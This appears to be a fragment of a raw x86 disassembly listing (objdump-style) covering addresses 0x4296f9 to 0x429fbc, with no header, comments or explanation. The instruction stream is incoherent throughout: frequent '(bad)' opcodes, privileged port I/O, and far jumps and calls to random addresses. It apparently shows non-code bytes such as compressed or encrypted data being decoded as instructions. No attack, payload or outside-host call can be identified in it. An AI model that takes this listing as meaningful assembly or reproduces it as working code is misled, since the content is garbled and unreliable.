  4296f9:	mov    edx,0xd4e4f002
  4296fe:	mov    ebp,0xc2f8bc
  429703:	out    0xc9,al
  429705:	(bad)  
  429706:	mov    esi,0xcecaf6ef
  42970b:	in     eax,0xf5
  42970d:	(bad)  
  42970f:	div    dl
  429711:	out    dx,al
  429712:	stc    
  429713:	int    0xd9
  429715:	out    dx,eax
  429716:	out    0xce,eax
  429718:	pop    es
  429719:	(bad)  
  42971b:	inc    BYTE PTR [ecx]
  42971d:	call   0xc4f7f29
  429722:	add    DWORD PTR ds:0xb1b7acd3,ecx
  429728:	lods   al,BYTE PTR ds:[esi]
  429729:	mov    ah,0xd2
  42972b:	sti    
  42972c:	retf   
  42972d:	rol    dh,cl
  42972f:	(bad)  
  429730:	fdiv   st,st(6)
  429732:	rcl    edx,cl
  429734:	fistp  QWORD PTR [edi-0x41243d39]
  42973a:	repnz add DWORD PTR [edi],eax
  42973d:	retf   
  42973e:	fsub   st,st(5)
  429740:	add    eax,0xa7e3fdff
  429745:	xlat   BYTE PTR ds:[ebx]
  429746:	int3   
  429747:	lods   eax,DWORD PTR ds:[esi]
  429748:	out    dx,eax
  429749:	out    0xeb,al
  42974b:	retf   0xdad2
  42974e:	sti    
  42974f:	fnstenv [ebp-0xf151144]
  429755:	std    
  429756:	iret   
  429757:	clc    
  429758:	xlat   BYTE PTR ds:[ebx]
  429759:	jmp    0x42974f
  42975b:	or     ecx,esi
  42975d:	clc    
  42975e:	in     al,0xf8
  429760:	in     eax,dx
  429761:	jmp    0x429776
  429763:	or     bh,BYTE PTR [eax-0xe101c0d]
  429769:	cmc    
  42976a:	int3   
  42976b:	leave  
  42976c:	iret   
  42976d:	fmul   st,st(4)
  42976f:	not    cl
  429771:	in     eax,dx
  429772:	fmul   st,st(5)
  429774:	iret   
  429775:	int3   
  429776:	(bad)  
  429778:	icebp  
  429779:	ror    ebx,0xda
  42977c:	in     eax,0x1
  42977e:	retf   0xf8e7
  429781:	(bad)  
  429782:	out    dx,eax
  429783:	call   0xcb097f4c
  429788:	retf   0xc4f3
  42978b:	out    0xb7,eax
  42978d:	mov    ecx,0xd0bbd8db
  429792:	cmc    
  429793:	fsubr  st(1),st
  429795:	clc    
  429796:	cmc    
  429797:	fdiv   st(5),st
  429799:	ret    0xbcc4
  42979c:	fcmovu st,st(6)
  42979e:	(bad)  
  4297a0:	fisttp QWORD PTR ds:0xe7bdcd0f
  4297a6:	retf   
  4297a7:	jmp    0xb71d6174
  4297ac:	div    edi
  4297ae:	hlt    
  4297af:	in     al,dx
  4297b0:	idiv   dl
  4297b2:	aad    0xfe
  4297b4:	fstp   TBYTE PTR [eax-0x273e2704]
  4297ba:	xlat   BYTE PTR ds:[ebx]
  4297bb:	les    ecx,FWORD PTR [edx]
  4297bd:	not    esi
  4297bf:	call   0x5215d91
  4297c4:	jecxz  0x429797
  4297c6:	icebp  
  4297c7:	lock jecxz 0x42977e
  4297ca:	in     eax,dx
  4297cb:	aad    0xca
  4297cd:	out    dx,al
  4297ce:	lock fstp TBYTE PTR [ecx-0x4460322]
  4297d5:	aam    0xc0
  4297d7:	sar    eax,1
  4297d9:	add    cl,bl
  4297db:	ret    
  4297dc:	sti    
  4297dd:	hlt    
  4297de:	cmc    
  4297df:	hlt    
  4297e0:	dec    ebx
  4297e2:	or     bl,al
  4297e4:	lods   eax,DWORD PTR ds:[esi]
  4297e5:	mov    cl,0xcd
  4297e7:	test   al,0xf2
  4297e9:	icebp  
  4297ea:	mov    cl,0xf9
  4297ec:	in     al,0xea
  4297ee:	mov    al,0xca
  4297f0:	repz (bad) 
  4297f2:	mov    edi,0xbdbcdefc
  4297f7:	test   DWORD PTR [ebx],0xe6e10b0b
  4297fd:	fmul   QWORD PTR [edi]
  4297ff:	add    eax,0xd8de04de
  429804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429805:	scas   eax,DWORD PTR es:[edi]
  429806:	shr    al,1
  429808:	mov    dh,0xf3
  42980a:	mov    ch,0xca
  42980c:	mov    dl,0xca
  42980e:	lock enter 0xf2cd,0xf5
  429813:	test   ebp,0xed00e3fe
  429819:	rol    bl,cl
  42981b:	fistp  QWORD PTR [edi-0x23fa1716]
  429821:	(bad)  [eax]
  429823:	out    0xe4,al
  429825:	icebp  
  429826:	mov    bh,0xbe
  429828:	xlat   BYTE PTR ds:[ebx]
  429829:	jecxz  0x4297dc
  42982b:	mov    cl,0xcd
  42982d:	int    0xf7
  42982f:	fstp   TBYTE PTR [eax-0x52d0f13]
  429835:	rcl    eax,1
  429837:	jmp    edi
  429839:	rol    ah,0x0
  42983c:	inc    DWORD PTR ds:0xffcbdaeb
  429842:	or     eax,0xe6e0b1ff
  429847:	scas   eax,DWORD PTR es:[edi]
  429848:	repnz les esi,FWORD PTR [eax-0x20461f18]
  42984f:	lock mov ecx,0xf8deb8c9
  429855:	enter  0xb8bd,0x0
  429859:	hlt    
  42985a:	ret    
  42985b:	(bad)  
  42985c:	jecxz  0x429848
  42985e:	mul    bl
  429860:	fcmovnu st,st(4)
  429862:	jmp    0xec1b7239
  429867:	jmp    0xbb1e7a57
  42986c:	mul    ah
  42986e:	test   dh,0xee
  429871:	jmp    0xfced:0xc1c2e2df
  429878:	stc    
  429879:	(bad)  
  42987a:	repnz push es
  42987c:	ret    
  42987d:	fldpi  
  42987f:	jmp    0xeecd:0xc80fd9e7
  429886:	rol    edi,cl
  429888:	in     eax,0xc1
  42988a:	repz mov al,0xfa
  42988d:	div    DWORD PTR [edi-0x44004849]
  429893:	mov    ecx,0x6dd01fc
  429898:	mov    esi,0xd4f5e4d7
  42989d:	add    BYTE PTR [edx],al
  42989f:	in     eax,0xd9
  4298a1:	cli    
  4298a2:	or     BYTE PTR [esi],al
  4298a4:	(bad)  
  4298a6:	fdivr  st(3),st
  4298a8:	rol    ebp,0xea
  4298ab:	mov    cl,0xe8
  4298ad:	in     al,0xcb
  4298af:	shr    esp,1
  4298b1:	std    
  4298b2:	in     eax,dx
  4298b3:	(bad)  
  4298b4:	icebp  
  4298b5:	shl    dh,1
  4298b7:	mov    eax,0xe4c5d9fa
  4298bc:	aad    0xe6
  4298be:	add    esi,ebp
  4298c0:	fsqrt  
  4298c2:	add    esp,ebx
  4298c4:	loopne 0x429883
  4298c6:	sar    DWORD PTR [ebp-0x4a1d1e2e],cl
  4298cc:	aam    0xda
  4298ce:	lock call 0xdc2095c9
  4298d4:	aad    0xdb
  4298d6:	into   
  4298d7:	mul    esp
  4298d9:	sar    esp,cl
  4298db:	loopne 0x4298c8
  4298dd:	aad    0x0
  4298df:	or     dl,bh
  4298e1:	repz fcmove st,st(3)
  4298e4:	(bad)  
  4298e5:	rcl    edi,cl
  4298e7:	ret    
  4298e8:	aam    0xdb
  4298ea:	aam    0xf1
  4298ec:	iret   
  4298ed:	call   0xd7147de0
  4298f2:	mov    esp,0xda03b7f7
  4298f7:	shl    esi,cl
  4298f9:	rcr    ebx,cl
  4298fb:	push   es
  4298fc:	jecxz  0x429907
  4298fe:	fld    DWORD PTR [eax]
  429900:	sti    
  429901:	fsub   st(5),st
  429903:	fxch   st(0)
  429905:	shr    al,0xc5
  429908:	(bad)  
  429909:	jecxz  0x4298b8
  42990b:	mov    dl,0xf7
  42990d:	not    dl
  42990f:	clc    
  429910:	repz jmp 0x4298fd
  429913:	aad    0xdc
  429915:	mov    esp,0x1dac1cf
  42991a:	in     eax,0x1
  42991c:	test   edi,0xc8fee305
  429922:	clc    
  429923:	into   
  429924:	repz fmul st,st(5)
  429927:	mov    cl,0xf0
  429929:	ret    
  42992a:	test   eax,0xf6aed5e5
  42992f:	stc    
  429930:	std    
  429931:	jmp    0x42990b
  429933:	loop   0x429924
  429935:	out    0xe7,eax
  429937:	out    0xd3,al
  429939:	aam    0xdd
  42993b:	add    ch,bl
  42993d:	retf   
  42993e:	iret   
  42993f:	cld    
  429940:	out    dx,al
  429941:	add    eax,ebp
  429943:	in     eax,dx
  429944:	lock jmp 0xe4ac:0xecdcc2c7
  42994c:	fucomi st,st(2)
  42994e:	aam    0xd8
  429950:	mov    edi,0xd0f4b8be
  429955:	repnz inc BYTE PTR [edi]
  429958:	vcmpss xmm7,xmm4,xmm3,0xe8
  42995d:	retf   
  42995e:	aam    0x5
  429960:	fsubr  st,st(6)
  429962:	fsub   st(0),st
  429964:	retf   
  429965:	(bad)  
  429967:	mov    cl,0xe3
  429969:	div    bh
  42996b:	jmp    0xf7959
  429970:	in     al,0xbd
  429972:	rol    BYTE PTR [edx],1
  429974:	add    ch,dh
  429976:	sar    BYTE PTR [esi-0x2305130a],0xc5
  42997d:	retf   0xc4d8
  429980:	hlt    
  429981:	(bad)
  429985:	retf   0xdde4
  429988:	leave  
  429989:	out    0xc2,eax
  42998b:	les    edi,FWORD PTR [ebx-0x5304946]
  429991:	mov    ebp,0xf5dffdc8
  429996:	rol    eax,1
  429998:	stc    
  429999:	cli    
  42999a:	rol    BYTE PTR ds:0xc9d70fde,1
  4299a0:	into   
  4299a1:	jmp    0x42997f
  4299a3:	or     al,0xcc
  4299a5:	stos   BYTE PTR es:[edi],al
  4299a6:	enter  0xc5ed,0xef
  4299aa:	lods   al,BYTE PTR ds:[esi]
  4299ab:	mov    ah,0xd0
  4299ad:	(bad)  
  4299af:	in     al,dx
  4299b0:	xlat   BYTE PTR ds:[ebx]
  4299b1:	add    edx,ecx
  4299b3:	repz enter 0xdbfb,0xcd
  4299b8:	xlat   BYTE PTR ds:[ebx]
  4299b9:	repz ret 0x90a
  4299bd:	xlat   BYTE PTR ds:[ebx]
  4299be:	or     al,bh
  4299c0:	(bad)  
  4299c1:	or     al,0x3
  4299c3:	or     bl,cl
  4299c5:	jmp    0xc9f6:0xc2e0e0ed
  4299cc:	cmc    
  4299cd:	les    edi,FWORD PTR [eax-0x4220290d]
  4299d3:	rcr    edi,1
  4299d5:	fadd   DWORD PTR [eax]
  4299d7:	sar    dh,0x5
  4299da:	push   ecx
  4299dc:	or     esi,edi
  4299de:	jmp    0xe6d8:0xd80afcc0
  4299e5:	fistp  QWORD PTR [edi-0x2d4b3031]
  4299eb:	into   
  4299ec:	enter  0xe8c8,0xeb
  4299f0:	jmp    0xbdf74ee2
  4299f5:	mov    edx,0xc7f606bc
  4299fa:	in     al,0xd5
  4299fc:	ret    
  4299fd:	fimul  WORD PTR [ecx]
  4299ff:	add    eax,0xe8050aec
  429a04:	in     al,dx
  429a05:	(bad)  
  429a06:	jecxz  0x4299e6
  429a08:	in     al,dx
  429a09:	(bad)  
  429a0b:	div    BYTE PTR [esi-0x2713362b]
  429a11:	retf   0xd2df
  429a14:	(bad)  
  429a15:	sti    
  429a16:	out    0xdf,al
  429a18:	int    0x2
  429a1a:	or     dl,ch
  429a1c:	xlat   BYTE PTR ds:[ebx]
  429a1d:	(bad)  
  429a1e:	retf   
  429a1f:	clc    
  429a20:	clc    
  429a21:	or     dh,ch
  429a23:	repz mov bl,0xad
  429a26:	fidivr WORD PTR [ebp-0x42c1b0a]
  429a2c:	mov    ah,0xc0
  429a2e:	(bad)  
  429a2f:	aad    0xdf
  429a31:	clc    
  429a32:	ret    
  429a33:	fucomi st,st(0)
  429a35:	fdiv   st,st(7)
  429a37:	add    eax,0xd9f002df
  429a3c:	out    0xde,al
  429a3e:	iret   
  429a3f:	out    dx,eax
  429a40:	add    dh,ch
  429a42:	(bad)  
  429a45:	shr    esi,1
  429a47:	fidiv  WORD PTR [ebp-0x461f0854]
  429a4d:	into   
  429a4e:	out    0xb5,eax
  429a50:	int    0xf2
  429a52:	fiadd  DWORD PTR [ecx]
  429a54:	rol    BYTE PTR [ecx],1
  429a56:	in     eax,dx
  429a57:	jecxz  0x429a1e
  429a59:	(bad)  
  429a5b:	(bad)  
  429a5c:	jmp    0xc8209137
  429a61:	into   
  429a62:	fcmovne st,st(7)
  429a64:	jmp    0xc8c6:0xf3e2ace5
  429a6b:	repz mov bh,0xc5
  429a6e:	call   0xcf368364
  429a73:	(bad)  
  429a75:	xlat   BYTE PTR ds:[ebx]
  429a76:	fdiv   st(1),st
  429a78:	(bad)  
  429a7a:	mov    ebp,0x207c6e3
  429a7f:	ffree  st(3)
  429a81:	add    dl,BYTE PTR [edx]
  429a83:	or     ebp,DWORD PTR [ebx-0x35114151]
  429a89:	hlt    
  429a8a:	(bad)  
  429a8c:	int3   
  429a8d:	mov    ebx,0xbcd9c9ba
  429a92:	ret    
  429a93:	(bad)  
  429a94:	mov    esp,0xddc6d5e2
  429a99:	int3   
  429a9a:	mov    esp,0xf900c5d2
  429a9f:	jmp    0xcc459b9e
  429aa4:	rol    bl,0xb1
  429aa7:	jmp    0x429a60
  429aa9:	mov    al,0xeb
  429aab:	aad    0xee
  429aad:	mov    al,0xe7
  429aaf:	fsubp  st(0),st
  429ab1:	mov    dl,0xf9
  429ab3:	cld    
  429ab4:	call   0xe73482b0
  429ab9:	shl    edx,0xfe
  429abc:	xlat   BYTE PTR ds:[ebx]
  429abd:	retf   0xefd6
  429ac0:	fsqrt  
  429ac2:	in     eax,0xb
  429ac4:	(bad)  
  429ac6:	imul   DWORD PTR [eax-0x311e103d]
  429acc:	mov    ah,0xd7
  429ace:	into   
  429acf:	leave  
  429ad0:	mov    ch,0xcf
  429ad2:	mov    ebx,0xccbcf6e3
  429ad7:	add    eax,0xeadac1cc
  429adc:	div    bh
  429ade:	fsub   st(1),st
  429ae0:	call   0xec425cce
  429ae5:	(bad)  
  429ae6:	test   ecx,0xb2fbadf7
  429aec:	iret   
  429aed:	sti    
  429aee:	mov    ah,0xed
  429af0:	into   
  429af1:	mov    esp,0xfcf4eefb
  429af6:	rol    BYTE PTR [ebx],cl
  429af8:	fsub   st(4),st
  429afa:	(bad)  
  429afc:	shr    edi,1
  429afe:	fisttp WORD PTR [edi]
  429b00:	jecxz  0x429b0d
  429b02:	add    BYTE PTR [esi],cl
  429b04:	scas   al,BYTE PTR es:[edi]
  429b05:	out    0xb2,al
  429b07:	into   
  429b08:	mov    dl,0xcb
  429b0a:	into   
  429b0b:	loopne 0x429af3
  429b0d:	(bad)  
  429b0e:	iret   
  429b0f:	mov    edx,0xefd9f2f8
  429b14:	mov    eax,0xd3e1e3d7
  429b19:	add    esi,ebx
  429b1b:	loopne 0x429aed
  429b1d:	fiadd  WORD PTR ds:0xf9c9deee
  429b23:	push   cs
  429b24:	int    0xaf
  429b26:	loopne 0x429b0d
  429b28:	(bad)  
  429b29:	(bad)
  429b2c:	loopne 0x429b0d
  429b2e:	(bad)  
  429b31:	retf   
  429b32:	lock int 0xda
  429b35:	shl    DWORD PTR [ebp-0x28fe0844],0xc1
  429b3c:	rol    BYTE PTR [ecx],1
  429b3e:	push   esi
  429b40:	psubd  mm3,mm7
  429b43:	add    ecx,esi
  429b45:	retf   
  429b46:	mov    al,0xd2
  429b48:	sar    BYTE PTR [edx+eax*8-0x836482d],1
  429b4f:	fbstp  TBYTE PTR [esi-0x12082f06]
  429b55:	into   
  429b56:	fsubrp st(1),st
  429b58:	(bad)  
  429b5a:	cmc    
  429b5b:	in     eax,0xea
  429b5d:	enter  0xde8,0xed
  429b61:	or     ah,bh
  429b63:	bnd jmp 0xea35642d
  429b69:	int3   
  429b6a:	lock shl ch,0xc9
  429b6e:	clc    
  429b6f:	jmp    0xe1df:0x3efedf0
  429b76:	repnz inc cl
  429b79:	mov    BYTE PTR [ecx],0xb
  429b7c:	in     al,0xff
  429b7e:	in     al,0xe4
  429b80:	jmp    0xd9297a8c
  429b85:	loopne 0x429b79
  429b87:	lods   eax,DWORD PTR ds:[esi]
  429b88:	shl    ah,1
  429b8a:	mov    ah,0xcc
  429b8c:	call   0xce115445
  429b91:	aad    0xf8
  429b93:	in     al,dx
  429b94:	sti    
  429b95:	enter  0x2f4,0xe5
  429b99:	mov    edx,0xc7e3e9df
  429b9e:	inc    BYTE PTR [esi]
  429ba0:	retf   0x4c6
  429ba3:	repz icebp 
  429ba5:	mov    esp,0xd4e4b3e1
  429baa:	loop   0x429b63
  429bac:	mov    cl,0xfb
  429bae:	mov    edi,0xf3daf4d3
  429bb3:	jmp    0xd7f9:0xd9f7d6f0
  429bba:	(bad)  
  429bbb:	fmul   DWORD PTR [ecx]
  429bbd:	hlt    
  429bbe:	add    eax,0xed00e9c7
  429bc3:	jmp    0xe0d1:0xdceff1c5
  429bca:	lods   eax,DWORD PTR ds:[esi]
  429bcb:	loopne 0x429bb8
  429bcd:	sti    
  429bce:	(bad)  
  429bcf:	std    
  429bd0:	into   
  429bd1:	fstp   TBYTE PTR [esi-0x3c45102d]
  429bd7:	loope  0x429bcb
  429bd9:	fcmovu st,st(3)
  429bdb:	or     DWORD PTR [edx],eax
  429bdd:	cmc    
  429bde:	ror    edi,0xce
  429be1:	or     al,0xff
  429be3:	ror    cl,0xb3
  429be6:	test   esi,0xc7cab3d4
  429bec:	fdivr  DWORD PTR [edx-0x10202126]
  429bf2:	fld    QWORD PTR [edx]
  429bf4:	mov    ebx,0xdcd6c0f0
  429bf9:	cli    
  429bfa:	repnz out 0xc5,eax
  429bfd:	test   dh,0xed
  429c00:	iret   
  429c01:	loop   0x429bd2
  429c03:	jmp    0x429be5
  429c05:	stos   BYTE PTR es:[edi],al
  429c06:	lock loop 0x429bb4
  429c09:	mov    cl,0xe9
  429c0b:	shl    eax,1
  429c0d:	sti    
  429c0e:	fidiv  DWORD PTR [esp+ecx*8-0x3c03151c]
  429c15:	test   DWORD PTR [ebx],0xd8f5d0f5
  429c1b:	hlt    
  429c1c:	jmp    0xd9c4:0xd8f90e06
  429c23:	fisub  DWORD PTR [edi-0x4f22422e]
  429c29:	in     eax,0xb0
  429c2b:	retf   0xd4d9
  429c2e:	neg    edx
  429c30:	(bad)  
  429c31:	in     al,dx
  429c32:	aam    0xe9
  429c34:	cld    
  429c35:	mov    esp,0x6e0fde2
  429c3a:	jmp    0xdd00:0xdcd007c3
  429c41:	(bad)  
  429c43:	adc    dl,cl
  429c45:	mov    esp,0xc2f5f2f1
  429c4a:	mov    dh,0xd1
  429c4c:	loope  0x429c23
  429c4e:	(bad)  
  429c4f:	lock out dx,eax
  429c51:	fdiv   st,st(5)
  429c53:	fcmovnbe st,st(7)
  429c55:	icebp  
  429c56:	repnz out 0xdc,eax
  429c59:	out    0xc3,eax
  429c5b:	sar    ebx,1
  429c5d:	add    ecx,edi
  429c5f:	iret   
  429c60:	(bad)  
  429c62:	fucomi st,st(5)
  429c64:	in     eax,0xd8
  429c66:	mov    bh,0xb0
  429c68:	out    dx,eax
  429c69:	lock ret 0xf2cb
  429c6d:	out    0xfb,eax
  429c6f:	(bad)  
  429c71:	hlt    
  429c72:	(bad)  
  429c73:	int3   
  429c74:	in     eax,dx
  429c75:	stc    
  429c76:	into   
  429c77:	call   ebx
  429c79:	fcomp  st(5)
  429c7b:	add    dl,ch
  429c7d:	dec    BYTE PTR [esi]
  429c7f:	(bad)  
  429c81:	add    al,0xec
  429c83:	jmp    0xcc2a7c69
  429c88:	stos   DWORD PTR es:[edi],eax
  429c89:	retf   
  429c8a:	shl    ah,1
  429c8c:	mov    ebx,0xd3ebd9ae
  429c91:	aam    0xee
  429c93:	int3   
  429c94:	mov    esi,0xe6ee00ee
  429c99:	(bad)  
  429c9a:	out    0xc4,eax
  429c9c:	ret    0xe7e3
  429c9f:	push   es
  429ca0:	add    esp,eax
  429ca2:	cli    
  429ca3:	add    al,0xab
  429ca5:	int    0xa9
  429ca7:	mov    esp,0xede2c1bd
  429cac:	mov    ch,0xe8
  429cae:	in     al,dx
  429caf:	mov    edx,0xb902d2fb
  429cb4:	loop   0x429c8b
  429cb6:	into   
  429cb7:	stc    
  429cb8:	rol    ebx,0xd1
  429cbb:	ret    0xc707
  429cbe:	hlt    
  429cbf:	leave  
  429cc0:	psubusw mm0,mm4
  429cc3:	(bad)  
  429cc4:	fxch   st(5)
  429cc6:	shl    edx,0xc3
  429cc9:	in     al,dx
  429cca:	rol    esp,0xb7
  429ccd:	in     eax,dx
  429cce:	in     eax,0xce
  429cd0:	enter  0xfdbe,0xf3
  429cd4:	fsubrp st(2),st
  429cd6:	clc    
  429cd7:	ffreep st(0)
  429cd9:	ret    0xfed3
  429cdc:	out    0xc6,al
  429cde:	loope  0x429ca7
  429ce0:	jmp    0x429cdf
  429ce2:	out    0xd,al
  429ce4:	mov    bl,0xb2
  429ce6:	(bad)  
  429ce8:	mov    ebp,0xf1e4ced0
  429ced:	in     eax,0xeb
  429cef:	stc    
  429cf0:	fld    QWORD PTR [ebx]
  429cf2:	mov    ebx,0xf6ffcedc
  429cf7:	std    
  429cf8:	aad    0x4
  429cfa:	push   es
  429cfb:	loopne 0x429cda
  429cfd:	inc    ecx
  429cff:	test   ch,0xc2
  429d02:	clc    
  429d03:	retf   0xf0f0
  429d06:	repz leave 
  429d08:	stos   DWORD PTR es:[edi],eax
  429d09:	in     al,0xc9
  429d0b:	hlt    
  429d0c:	in     al,0xf5
  429d0e:	in     al,dx
  429d0f:	stc    
  429d10:	jmp    0xb8e1:0xc9dcfe
  429d17:	loope  0x429ceb
  429d19:	rcl    dh,0xfe
  429d1c:	add    al,0xdf
  429d1e:	mov    ebp,0x9eed809
  429d23:	or     esp,edx
  429d25:	ror    edx,1
  429d27:	retf   0xf2e2
  429d2a:	int    0xba
  429d2c:	lds    edi,FWORD PTR [eax-0x1c0f4539]
  429d32:	repnz int 0xd5
  429d35:	aad    0xf9
  429d37:	out    dx,al
  429d38:	(bad)  
  429d3a:	rol    DWORD PTR [edx],cl
  429d3c:	out    0xf0,eax
  429d3e:	cld    
  429d3f:	fsub   st(5),st
  429d41:	sti    
  429d42:	add    dl,bl
  429d44:	in     al,0xc0
  429d46:	(bad)  
  429d47:	fdiv   QWORD PTR [eax-0x17063b2b]
  429d4d:	mov    dl,0xe7
  429d4f:	inc    ebp
  429d51:	(bad)  
  429d52:	mov    edi,0xd5def1da
  429d57:	aad    0xe2
  429d59:	add    dh,bl
  429d5b:	aam    0xc9
  429d5d:	add    BYTE PTR [ebp+0x80f08db],bh
  429d63:	stc    
  429d64:	mov    esp,0xcccceca6
  429d69:	mov    al,0xec
  429d6b:	cmc    
  429d6c:	retf   0xd7ff
  429d6f:	fxch   st(0)
  429d71:	fldpi  
  429d73:	mov    esi,0xceeef4d5
  429d78:	rol    esp,0xf4
  429d7b:	ffree  st(1)
  429d7d:	cli    
  429d7e:	call   0xf2c7348
  429d83:	or     cl,bl
  429d85:	ret    0xc9af
  429d88:	in     eax,dx
  429d89:	in     al,0xb6
  429d8b:	(bad)
  429d8e:	(bad)  
  429d91:	into   
  429d92:	mov    esi,0xe6fdd3f9
  429d97:	mov    cl,0xba
  429d9a:	(bad)  
  429d9b:	div    bh
  429d9d:	leave  
  429d9e:	retf   0xcdf6
  429da1:	enter  0xdefd,0xe6
  429da5:	ffree  st(5)
  429da7:	mov    al,0xe1
  429da9:	loopne 0x429d61
  429dab:	mov    cl,0xcc
  429dad:	mov    edx,0xbceaf9e9
  429db2:	call   0xfa1c7281
  429db7:	ret    
  429db8:	repnz sar al,0xc6
  429dbc:	cld    
  429dbd:	stc    
  429dbe:	std    
  429dbf:	(bad)  
  429dc0:	out    0x3,eax
  429dc2:	shl    edi,0xc8
  429dc5:	jmp    0x429db3
  429dc7:	out    0xad,al
  429dc9:	enter  0xd0b7,0xb1
  429dcd:	in     eax,0xc7
  429dcf:	mov    edx,0xf7bdbcdb
  429dd4:	repz ret 0xb4b9
  429dd8:	clc    
  429dd9:	int3   
  429dda:	loope  0x429dc3
  429ddc:	mov    edi,0xdb030408
  429de1:	into   
  429de2:	lds    ecx,FWORD PTR [edx]
  429de4:	in     eax,dx
  429de5:	rcl    bh,0xeb
  429de8:	test   ecx,0xeceaf5c8
  429dee:	stc    
  429def:	iret   
  429df0:	cld    
  429df1:	repnz idiv DWORD PTR [ecx-0xc081822]
  429df8:	mov    ebp,0xe303d205
  429dfd:	sti    
  429dfe:	stc    
  429dff:	into   
  429e00:	add    bl,ah
  429e02:	retf   0xedde
  429e05:	repz enter 0xd4a8,0xf0
  429e0a:	test   eax,0xcac9f1c0
  429e0f:	sar    DWORD PTR [edx-0x272f0f44],cl
  429e15:	(bad)  
  429e16:	(bad)  
  429e17:	sti    
  429e18:	mov    esi,0xc0f2c0ff
  429e1d:	rcl    dh,0xd6
  429e20:	call   0xa91b7bf3
  429e25:	shl    ebx,cl
  429e27:	ret    
  429e28:	repz mov dh,0xe9
  429e2b:	loop   0x429de7
  429e2d:	mov    eax,0x3cfdafb
  429e32:	mov    esi,0xd7daf0d5
  429e37:	ret    0x4dc
  429e3a:	cli    
  429e3b:	stc    
  429e3c:	pop    es
  429e3d:	retf   0xdfe0
  429e40:	(bad)  
  429e41:	repz clc 
  429e43:	retf   0xc8b1
  429e46:	jecxz  0x429e32
  429e48:	int3   
  429e49:	fnclex 
  429e4b:	retf   
  429e4c:	idiv   edx
  429e4e:	call   0xef1a752d
  429e53:	mov    al,0xd3
  429e55:	add    cl,ah
  429e57:	ret    
  429e58:	ror    ah,1
  429e5a:	jmp    edi
  429e5c:	sti    
  429e5d:	aam    0xc6
  429e5f:	test   BYTE PTR [edi],0xd9
  429e62:	jecxz  0x429e57
  429e64:	shl    esi,0xe2
  429e67:	icebp  
  429e68:	div    DWORD PTR [eax-0x3129043e]
  429e6e:	retf   
  429e6f:	mov    ebx,0xd1caf9fd
  429e74:	shr    eax,cl
  429e76:	iret   
  429e77:	repz loopne 0x429e6b
  429e7a:	retf   
  429e7b:	rcr    dl,1
  429e7d:	add    ebx,ebp
  429e7f:	dec    ecx
  429e81:	fsub   st,st(2)
  429e83:	loope  0x429e47
  429e85:	call   0xd824516e
  429e8a:	retf   0xe9cd
  429e8d:	in     al,dx
  429e8e:	lock (bad) 
  429e91:	mov    edi,0xbed1dcf2
  429e96:	fdiv   st(2),st
  429e98:	add    eax,ebp
  429e9a:	dec    DWORD PTR [ecx]
  429e9c:	push   es
  429e9d:	clc    
  429e9e:	jecxz  0x429ea8
  429ea0:	psrad  mm5,mm5
  429ea3:	into   
  429ea4:	fsubr  st(3),st
  429ea6:	leave  
  429ea7:	mov    esp,0xf1caf7ca
  429eac:	fadd   st,st(7)
  429eae:	mov    edx,0xbfdecdcf
  429eb3:	cmc    
  429eb4:	leave  
  429eb5:	aam    0xee
  429eb7:	test   DWORD PTR [ebx],0xe701e6ec
  429ebd:	retf   0xe5e0
  429ec0:	fchs   
  429ec2:	jmp    0x429e96
  429ec4:	repz repnz icebp 
  429ec7:	mov    ebp,0xe7f6e0c9
  429ecc:	mov    ch,0xe7
  429ece:	(bad)
  429ed1:	fsubrp st(2),st
  429ed3:	ret    0xd4ee
  429ed6:	fild   DWORD PTR ds:0xd9febae2
  429edc:	aad    0xd5
  429ede:	cmc    
  429edf:	out    0xc6,eax
  429ee1:	iret   
  429ee2:	shl    ebx,cl
  429ee4:	ret    
  429ee5:	xlat   BYTE PTR ds:[ebx]
  429ee6:	jmp    0x429eda
  429ee8:	in     al,dx
  429ee9:	xlat   BYTE PTR ds:[ebx]
  429eea:	iret   
  429eeb:	mov    ah,0xf7
  429eed:	retf   0xbae6
  429ef0:	std    
  429ef1:	jmp    0xbefb9db0
  429ef6:	mov    ch,0xc1
  429ef8:	rcl    ebx,0xdb
  429efb:	(bad)  
  429efc:	(bad)  
  429efe:	in     eax,0xe6
  429f00:	push   cs
  429f01:	(bad)  
  429f02:	fmul   DWORD PTR ds:0xb7cef0f3
  429f08:	rol    ebp,1
  429f0a:	repz aad 0xd5
  429f0d:	iret   
  429f0e:	inc    dh
  429f10:	jmp    0x429ee8
  429f12:	jecxz  0x429ef7
  429f14:	add    ecx,ebx
  429f16:	stc    
  429f17:	mov    esi,0xc5f3f4
  429f1c:	rol    dh,0xd9
  429f1f:	fmul   DWORD PTR [ecx]
  429f21:	repz (bad) 
  429f23:	push   DWORD PTR [edx-0x18533b35]
  429f29:	mov    esp,0xf9b0ced6
  429f2e:	retf   0xbdee
  429f31:	icebp  
  429f32:	jmp    0x429f27
  429f34:	hlt    
  429f35:	ret    
  429f36:	clc    
  429f37:	cld    
  429f38:	xlat   BYTE PTR ds:[ebx]
  429f39:	add    ebx,ebx
  429f3b:	std    
  429f3c:	fsubr  st(4),st
  429f3e:	retf   0x2e5
  429f41:	fisttp WORD PTR [eax+eax*1]
  429f44:	(bad)  
  429f45:	in     al,0xe4
  429f47:	scas   al,BYTE PTR es:[edi]
  429f48:	mov    ebp,0xb9c6e5b3
  429f4d:	mov    edx,0xcbd3d3d7
  429f52:	sti    
  429f53:	jmp    0xbc06:0xffcd00db
  429f5a:	icebp  
  429f5b:	add    eax,0xe6c10bfc
  429f60:	enter  0xe7ef,0xf2
  429f64:	(bad)  
  429f66:	jmp    0xe8c1:0xf3caf7be
  429f6d:	mov    dl,0xf7
  429f6f:	cli    
  429f70:	(bad)  
  429f72:	enter  0x3e2,0xe2
  429f76:	aam    0x7
  429f78:	(bad)  
  429f7a:	jmp    0xeb0f:0xd6fde8f7
  429f81:	add    eax,0xb3d0ec0a
  429f86:	les    esi,FWORD PTR [ebx-0x2a162a44]
  429f8c:	mov    edx,0xffecc5df
  429f91:	shl    esi,1
  429f93:	stc    
  429f94:	lock mov edx,0xc3f5d4ed
  429f9a:	sar    cl,cl
  429f9c:	(bad)  
  429f9d:	loope  0x429fa7
  429f9f:	in     eax,dx
  429fa0:	enter  0xdefe,0xd
  429fa4:	icebp  
  429fa5:	ret    
  429fa6:	lds    ebp,FWORD PTR [eax-0x2a534a1c]
  429fac:	fdiv   st,st(0)
  429fae:	mov    esp,0xecd4d8be
  429fb4:	hlt    
  429fb5:	not    esi
  429fb7:	mov    ebp,0xc1c2d8db
  429fbc:	jmp    0xc60aa1bb
